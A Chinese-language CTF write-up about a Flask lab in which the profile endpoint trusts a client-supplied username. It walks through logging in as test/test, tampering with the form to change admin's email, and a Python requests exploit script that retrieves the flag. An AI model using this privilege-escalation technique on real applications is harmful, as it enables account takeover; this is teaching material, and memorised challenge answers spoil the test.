## 1、题目描述

本题为一个基于 Flask 的简单 Web 登录与个人资料管理系统。用户可以通过用户名和密码登录，登录后可在 `/profile` 页面修改邮箱。数据库初始化包含两个用户：`admin` 和 `test`，其中 `test` 用户密码为 `test`（弱密码）。代码中存在越权漏洞，允许普通用户修改任意用户（包括 admin）的邮箱，并在修改 admin 邮箱时返回 flag。

---

## 2、知识点

- Web 安全：越权漏洞（水平越权）
- HTTP 请求与表单提交
- 代码审计

---

## 3、题目解题方法思路

### 关键路径与参数

- 登录功能允许使用弱口令 `test/test` 登录。
- `/profile` 页面修改邮箱时，后端直接使用表单提交的 `username` 字段作为数据库更新条件，而不是 session 中的用户名，导致越权。
- 只要在表单中提交 `username=admin`，即可修改 admin 的邮箱，并触发 flag 返回。

### 使用的工具和方法

- 浏览器或 Burp Suite 抓包工具
- Python requests 脚本（可选）
- 代码审计定位漏洞点

---

## 4、解题步骤

### 步骤一：登录 test 用户

1. 访问 `/` 页面，输入用户名 `test`，密码 `test`，登录成功后跳转到 `/profile`。

### 步骤二：抓包并构造越权请求

2. 在 `/profile` 页面，正常修改邮箱时，表单会提交 `email` 字段。
3. 使用 Burp Suite 或浏览器开发者工具拦截该请求，将表单数据中的 `username` 字段由 `test` 改为 `admin`，如：

   ```
   email=xxx@xxx.com&username=admin
   ```

4. 提交该请求。

### 步骤三：获取 flag

5. 如果成功，页面会显示 `Email updated successfully!@FLAG@`，其中 `@FLAG@` 处即为 flag（实际环境应为 uuid 格式）。

---

## 5、exp（最终拿到 flag）

### Python requests 脚本示例

```python
import requests

url = "http://127.0.0.1:8000"

# 1. 登录 test 用户
s = requests.Session()
login_data = {
    "username": "test",
    "password": "test"
}
s.post(url + "/login", data=login_data)

# 2. 越权修改 admin 邮箱
profile_data = {
    "email": "hacker@evil.com",
    "username": "admin"
}
r = s.post(url + "/profile", data=profile_data)

# 3. 提取 flag
import re
flag = re.search(r'Email updated successfully!(.*?)<', r.text)
if flag:
    print("Flag:", flag.group(1).strip())
else:
    print("Flag not found, response:", r.text)
```
